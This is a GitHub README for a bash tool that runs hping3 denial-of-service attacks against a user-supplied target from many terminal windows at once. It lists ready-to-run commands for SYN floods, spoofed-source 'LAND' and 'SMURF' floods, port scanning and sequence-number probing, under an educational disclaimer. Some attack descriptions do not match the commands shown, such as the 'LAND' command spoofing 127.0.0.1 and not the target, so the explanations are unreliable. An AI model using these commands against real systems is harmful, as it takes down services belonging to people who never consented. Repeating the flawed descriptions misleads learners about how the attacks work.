# DdosHping3

Welcome to the **DdosHping3** repository! This project provides a bash script that allows users to simulate various network attack scenarios using `hping3`. The script offers a user-friendly interface for selecting attack types, targeting specific IPs, and managing multiple terminal instances for concurrent execution.

## Table of Contents

- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
- [Available Attacks](#available-attacks)
- [Script Details](#script-details)
- [Disclaimer](#disclaimer)
- [Contributing](#contributing)
- [License](#license)

## Introduction

This repository serves as a tool for educational purposes, particularly in understanding network security, penetration testing, and the implications of various types of Denial-of-Service (DoS) attacks. By using this script, users can experiment in a controlled environment to learn how these attacks work and how to defend against them.

## Prerequisites

Before using the script, ensure you have the following installed on your system:

- **hping3**: This tool is essential for crafting and sending custom TCP/IP packets. The script will attempt to install it if it's not already present.
- **Terminal Emulator**: The script supports either `xterm` or `gnome-terminal`. Ensure one of these is installed.
- **wmctrl** (optional): This tool can be used for automatically arranging terminal windows, though it's not mandatory.

## Installation

To set up the necessary components, follow these steps:

1. **Clone the repository:**
   ```bash
   git clone https://github.com/hacksudo/DdosHping3.git
   cd DdosHping3

    Make the script executable:

    bash

chmod +x DdosHping3.sh

Install hping3 (if not installed):

bash

sudo apt-get install -y hping3

Install wmctrl (optional):

bash

    sudo apt-get install -y wmctrl

Usage

To run the script, execute the following command:

bash

./DdosHping3.sh

You will be prompted to enter:

    Target IP or hostname: Specify the target you wish to attack.
    Attack type: Choose from the available options.
    Number of terminal instances: Indicate how many terminals you want to open for the attack.

The script will then initiate the chosen attack across the specified number of terminal windows.
Available Attacks

The script currently supports the following attack types:

    Port Scanning: Scans for open ports in the range 21-500.
        Command: hping3 -S --scan 21-500 <target>
    SYN Flood Attack: Floods the target with SYN packets to overwhelm the server.
        Command: hping3 -S -p 80 <target> --flood
    LAND Attack: Sends packets with the target IP as both the source and destination.
        Command: hping3 -S -p 80 <target> -a 127.0.0.1
    SMURF Attack: Uses ICMP echo requests to flood the target.
        Command: hping3 --icmp --flood <target> -a 127.0.0.1
    TCP Sequence Prediction Attack (ISN Prediction): Attempts to predict the initial sequence number of TCP connections.
        Command: hping3 -S -p 80 -Q 127.0.0.1

Script Details

The script is designed to check for the necessary tools, prompt the user for inputs, and launch multiple terminal windows running the selected attack. It also includes checks for terminal emulator availability and attempts to arrange the windows for better visibility.
Disclaimer

This script is intended for educational and research purposes only. Do not use this script against any system without explicit permission. Unauthorized access to computer systems is illegal and unethical. Always use responsibly and ethically.
Contributing

Contributions are welcome! If you have suggestions for improvements or new features, please create a pull request or open an issue.
License

This project is licensed under the MIT License. See the LICENSE file for details.
@Made by Vishal Waghmare 
instagram@realvilu
